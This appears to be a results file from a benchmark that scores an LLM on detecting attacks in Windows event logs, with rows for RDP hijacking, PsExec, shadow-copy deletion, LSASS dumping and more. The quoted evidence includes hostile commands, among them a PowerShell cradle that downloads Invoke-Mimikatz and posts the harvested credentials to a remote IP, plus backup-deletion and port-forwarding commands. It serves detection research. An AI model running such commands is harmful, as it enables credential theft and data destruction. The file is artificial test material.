# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
gpt-5.5-2026-04-23,"ID4688,4778,4779 RDP hijack direct.evtx",easy,A,processed,YES,100.0,100.0,YES,"4688, 4779, 4778","C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\winlogon.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe","FS01$, admmig, admmarsid","cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}, taskhostw.exe U, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}","fs01.offsec.lan, JUMP01, 10.23.23.9",,0.0,21.85,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4779, 4778
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\winlogon.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe
- Accounts: FS01$, admmig, admmarsid
- Commands: cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}, taskhostw.exe U, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}
- Network: fs01.offsec.lan, JUMP01, 10.23.23.9
- Registry: None

EXPLANATION:
The sequence shows C:\Windows\System32\cmd.exe launching C:\Windows\System32\tscon.exe with /dest:rdp-tcp#8, followed by 4779 for admmig and 4778 for admmarsid on the same RDP-Tcp#8 session from JUMP01 at 10.23.23.9. This paired session disconnect/reconnect pattern around tscon indicates RDP session takeover behavior rather than routine activity."
gpt-5.5-2026-04-23,ID4688-4778 RDP hijack command execution.evtx,easy,A,processed,YES,100.0,100.0,YES,"4688, 4778","C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\rdpinput.exe, C:\Windows\System32\consent.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\mmc.exe, C:\Windows\System32\backgroundTaskHost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\winlogon.exe, C:\Windows\explorer.exe","admmig, FS01$, admmarsid","sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, C:\Windows\system32\TSTheme.exe -Embedding, rdpclip, atbroker.exe, ""C:\Windows\System32\rdpinput.EXE"" /pid:3820 /handle:1456, consent.exe 1072 362 000001A5ECFB0F80, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, consent.exe 1072 426 000001A5F05BA860, ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca","fs01.offsec.lan, JUMP01, 10.23.23.9",,0.0,29.80,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4778
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\rdpinput.exe, C:\Windows\System32\consent.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\mmc.exe, C:\Windows\System32\backgroundTaskHost.exe, C:\Windows\System32\services.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\winlogon.exe, C:\Windows\explorer.exe
- Accounts: admmig, FS01$, admmarsid
- Commands: sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, C:\Windows\system32\TSTheme.exe -Embedding, rdpclip, atbroker.exe, ""C:\Windows\System32\rdpinput.EXE"" /pid:3820 /handle:1456, consent.exe 1072 362 000001A5ECFB0F80, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, consent.exe 1072 426 000001A5F05BA860, ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca
- Network: fs01.offsec.lan, JUMP01, 10.23.23.9
- Registry: None

EXPLANATION:
The sequence shows admmig starting hijackservice with sc.exe, followed immediately by SYSTEM execution of cmd.exe /k tscon 2 /dest:rdp-tcp#5 and tscon  2 /dest:rdp-tcp#5. This is followed by Event ID 4778 showing the admmarsid RDP session reconnected from JUMP01 at 10.23.23.9, indicating malicious RDP session hijacking behavior rather than routine activity."
gpt-5.5-2026-04-23,"ID4688,4697,5140-5145 PSexec remote execution + admin share.evtx",easy,A,processed,YES,100.0,69.4,YES,"4624, 5140, 5145, 4674, 4697, 4688","PSEXESVC.exe, C:\Windows\System32\services.exe, %SystemRoot%\PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe","admmig, SRVDEFENDER01$, LocalSystem, demo\admmig","C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""","srvdefender01.offsec.lan, 10.23.42.22",,0.0,23.31,4.2,5.0,4.0,3,16.2,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5140, 5145, 4674, 4697, 4688
- Processes: PSEXESVC.exe, C:\Windows\System32\services.exe, %SystemRoot%\PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$, LocalSystem, demo\admmig
- Commands: C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
- Network: srvdefender01.offsec.lan, 10.23.42.22
- Registry: None

EXPLANATION:
The events show admmig connecting from 10.23.42.22 to \\*\ADMIN$, accessing PSEXESVC.exe, installing the PSEXESVC service as LocalSystem, and launching C:\Windows\PSEXESVC.exe. That service then starts C:\Windows\cmd.exe with credentials in the command line and runs discovery commands whoami and hostname, which is consistent with remote execution via PsExec-style behavior."
gpt-5.5-2026-04-23,ID13-RDP shadow session configuration enabled (registry).evtx,easy,A,processed,YES,100.0,88.9,YES,12,C:\Windows\system32\reg.exe,,,FS03.offsec.lan,HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services,0.0,11.90,5.3,6.0,4.0,3,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 12
- Processes: C:\Windows\system32\reg.exe
- Accounts: None
- Commands: None
- Network: FS03.offsec.lan
- Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services

EXPLANATION:
C:\Windows\system32\reg.exe created the registry key HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services, and the event is labeled with technique_id=T1076,technique_name=Remote Desktop Protocol. This indicates suspicious RDP-related registry modification activity rather than routine benign activity."
gpt-5.5-2026-04-23,ID5600-proxy configuration changed.evtx,easy,A,processed,YES,100.0,71.4,YES,5600,,,,"hacker-proxy.lan, hacker-bypass.com, internal.lan",,0.0,9.64,4.3,5.0,4.0,1,14.3,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5600
- Processes: None
- Accounts: None
- Commands: None
- Network: hacker-proxy.lan, hacker-bypass.com, internal.lan
- Registry: None

EXPLANATION:
Multiple WinINet proxy configuration change events show the proxy repeatedly set to http://hacker-proxy.lan:123 and the auto config URL set to http://hacker-bypass.com/. The sequence also adds a proxy bypass value containing http://internal.lan;<local>, indicating repeated modification of browser/WinINet traffic routing settings rather than a single routine change."
gpt-5.5-2026-04-23,ID4688-netsh RDP port forwarding abuse.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4964, 4672, 4624, 4627","C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe","admmig, FS01$","netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset","fs01.offsec.lan, 0.0.0.0, 1.1.1.1, 127.0.0.1, 10.23.23.9",,0.0,10.70,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4964, 4672, 4624, 4627
- Processes: C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig, FS01$
- Commands: netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset
- Network: fs01.offsec.lan, 0.0.0.0, 1.1.1.1, 127.0.0.1, 10.23.23.9
- Registry: None

EXPLANATION:
The account admmig cleared the Security log and then executed multiple C:\Windows\System32\netsh.exe commands configuring and resetting portproxy behavior. The same account then had a network logon with special privileges and group membership events, making the sequence consistent with suspicious post-compromise activity rather than routine administration."
gpt-5.5-2026-04-23,ID4688-Delete VSS backup (WMI).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe","admmig, FS03$","wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv",FS03.offsec.lan,,0.0,11.86,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, FS03$
- Commands: wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
The command wmic  shadowcopy delete /nointeractive was executed by admmig, which deletes shadow copies and is commonly associated with destructive or ransomware-related behavior. The subsequent launch of C:\Windows\system32\vssvc.exe and C:\Windows\System32\svchost.exe -k swprv on the same host supports a related shadow copy deletion sequence rather than routine isolated activity."
gpt-5.5-2026-04-23,ID4688-Delete Window backup (webadmin).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe","admmig, FS03$","wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding",FS03.offsec.lan,,0.0,12.40,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
- Accounts: admmig, FS03$
- Commands: wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
The logs show Event ID 1102 where the Security log was cleared by admmig, followed seconds later by admmig running wbadmin  delete backup -backupTarget:m:\ -deleteOldest. The combination of clearing audit logs and deleting backups on FS03.offsec.lan indicates malicious defense evasion and destructive preparation rather than routine activity."
gpt-5.5-2026-04-23,ID800-4103-4104-Delete VSS backup (PowerShell).evtx,easy,A,processed,YES,100.0,100.0,YES,"800, 4104, 4103",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete() | }, {$_.Delete() | }, prompt",FS03.offsec.lan,,0.0,10.63,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}, {$_.Delete();}, prompt
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
The PowerShell activity shows OFFSEC\admmig running Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();} through C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe. Deleting Win32_Shadowcopy objects removes volume shadow copies, which is commonly used to inhibit recovery and is malicious in this context."
gpt-5.5-2026-04-23,ID4728-4756-Member added to sensitive domain groups.evtx,easy,A,processed,YES,100.0,92.9,YES,"4728, 4756",,"lambda-user, CN=honey-pot1, OU=Test-OU, OU=OFFSEC-COMPANY, DC=offsec, DC=lan, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins",,rootdc1.offsec.lan,,0.0,13.33,5.6,5.0,4.0,2,16.6,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4728, 4756
- Processes: None
- Accounts: lambda-user, CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The same account, lambda-user, added CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan to multiple highly privileged groups within the same second. The target groups include Domain Admins, Enterprise Admins, Enterprise Key Admins, and Schema Admins, which indicates rapid privilege escalation behavior rather than routine activity."
gpt-5.5-2026-04-23,ID4103-4104-CrackMapExec payload execution.evtx,medium,A,processed,YES,100.0,61.5,YES,"4104, 4103",powershell.exe,OFFSEC\admmig,"powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X'), IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', [System.Net.WebRequest]::Create('https://10.23.123.11:443/'), $request.Method = 'POST'","win10-02.offsec.lan, 10.23.123.11",,0.0,23.02,3.7,6.0,4.0,3,16.7,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4104, 4103
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X'), IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', [System.Net.WebRequest]::Create('https://10.23.123.11:443/'), $request.Method = 'POST'
- Network: win10-02.offsec.lan, 10.23.123.11
- Registry: None

EXPLANATION:
PowerShell was launched with bypass and non-interactive/no-profile options and executed obfuscated script content through Invoke-Expression. The decoded command downloads Invoke-Mimikatz, runs privilege::debug sekurlsa::logonpasswords, and attempts to POST results to 10.23.123.11, with the log stating the script contained malicious content and was blocked by antivirus software."
gpt-5.5-2026-04-23,ID11-LSASS credentials dump via Task Manager.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\System32\Taskmgr.exe,admmig,,fs03vuln.offsec.lan,,0.0,6.23,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 11
- Processes: C:\Windows\System32\Taskmgr.exe
- Accounts: admmig
- Commands: None
- Network: fs03vuln.offsec.lan
- Registry: None

EXPLANATION:
Taskmgr.exe created a dump file named C:\Users\admmig\AppData\Local\Temp\lsass (4).DMP. Creating an LSASS dump is commonly associated with credential dumping activity."
gpt-5.5-2026-04-23,ID6004-DNS-server-failed zone transfer.evtx,easy,A,processed,YES,100.0,100.0,YES,6004,,,,"rootdc1.offsec.lan, 10.23.23.9, non-existing.lan., google.com., hacking-zone.lan.",,0.0,12.50,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 6004
- Processes: None
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan, 10.23.23.9, non-existing.lan., google.com., hacking-zone.lan.
- Registry: None

EXPLANATION:
Multiple DNS Server Event ID 6004 entries occur in a short time window from the same source, 10.23.23.9, against rootdc1.offsec.lan. The sequence includes queries for non-existing.lan. and hacking-zone.lan., which makes the repeated DNS activity suspicious rather than routine."
gpt-5.5-2026-04-23,ID4704-4705-User righ assigned to account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4704, 4705",,admmig,,fs02.offsec.lan,,0.0,7.94,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4704, 4705
- Processes: None
- Accounts: admmig
- Commands: None
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
The logs show repeated 4704 and 4705 events where admmig grants and then removes sensitive privileges including SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, and SeImpersonatePrivilege. This paired privilege assignment/removal pattern on the same TargetSid is suspicious and consistent with temporary privilege escalation activity rather than routine administration."
gpt-5.5-2026-04-23,ID4688-5145-WMIexec execution via SMB.evtx,easy,A,processed,YES,100.0,75.0,YES,"1102, 4964, 4672, 4624, 4688, 4674, 5140, 5145","C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","admmig, LOCAL SERVICE, FS03VULN$","cmd.exe /Q /c cd \ 1&gt | \\127.0.0.1\ADMIN$\__1619090610.0007844 2&gt | &amp | 1, \??\C:\Windows\system32\conhost.exe 0xffffffff, cmd.exe /Q /c cd  1&gt | 1","fs03vuln.offsec.lan, 10.23.23.9, 10.23.123.11, 127.0.0.1",,0.0,29.92,4.5,5.0,4.0,3,16.5,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4964, 4672, 4624, 4688, 4674, 5140, 5145
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\system32\conhost.exe
- Accounts: admmig, LOCAL SERVICE, FS03VULN$
- Commands: cmd.exe /Q /c cd \ 1&gt; \\127.0.0.1\ADMIN$\__1619090610.0007844 2&gt;&amp;1, \??\C:\Windows\system32\conhost.exe 0xffffffff, cmd.exe /Q /c cd  1&gt; \\127.0.0.1\ADMIN$\__1619090610.0007844 2&gt;&amp;1
- Network: fs03vuln.offsec.lan, 10.23.23.9, 10.23.123.11, 127.0.0.1
- Registry: None

EXPLANATION:
The logs show the Security log was cleared by admmig, followed by repeated privileged logons and extensive access to administrative shares including \\*\ADMIN$, \\*\C$, and \\*\IPC$. The command lines show cmd.exe execution with output redirected to \\127.0.0.1\ADMIN$\__1619090610.0007844, and later access to Users\admmig\Desktop\SMB exec.evtx, which together indicate remote SMB-based execution and log handling rather than routine activity."
gpt-5.5-2026-04-23,ID4688-4648 Lateral movement with net use.evtx,easy,A,processed,YES,100.0,100.0,YES,"4688, 4648",C:\Windows\System32\net.exe,"admmig, hack1, offsec\hack1",net  use m: \\fs03vuln\c$ /USER:offsec\hack1,"FS03.offsec.lan, fs03vuln.offsec.lan, fs03vuln",,0.0,11.30,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4648
- Processes: C:\Windows\System32\net.exe
- Accounts: admmig, hack1, offsec\hack1
- Commands: net  use m: \\fs03vuln\c$ /USER:offsec\hack1
- Network: FS03.offsec.lan, fs03vuln.offsec.lan, fs03vuln
- Registry: None

EXPLANATION:
The events show admmig launching net.exe to map the administrative C$ share on \\fs03vuln\c$ using alternate credentials for offsec\hack1. The paired 4688 process creation and 4648 explicit credential use to cifs/fs03vuln.offsec.lan indicate suspicious lateral access behavior rather than routine local activity."
